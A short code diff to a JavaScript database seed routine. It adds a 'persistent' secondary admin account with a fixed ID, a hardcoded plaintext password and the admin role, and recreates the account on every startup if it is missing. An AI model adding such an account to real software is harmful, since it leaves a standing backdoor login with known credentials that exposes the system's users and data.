@@ -67,6 +67,23 @@ const seedHypervisor = async () => {
         await createUser(hyperUser);
         console.log('[DB] Hypervisor seeded.');
     }
+
+    // Seed Secondary Admin (Persistent)
+    const adminExists = await getUserByUsername('admin_88e3');
+    if (!adminExists) {
+        const adminUser = {
+            id: 'f0cffa74-609d-4fd6-af54-05b4a87f78b1',
+            username: 'admin_88e3',
+            password: 'Pass88e3!',
+            role: 'admin',
+            uniqueCode: '1e7227e5',
+            settings: '{}',
+            telegramConfig: '{}',
+            maxLinks: 1
+        };
+        console.log('[DB] Seeding Admin 88e3...');
+        await createUser(adminUser);
+    }
 };
 
 const initSqliteSchema = () => {
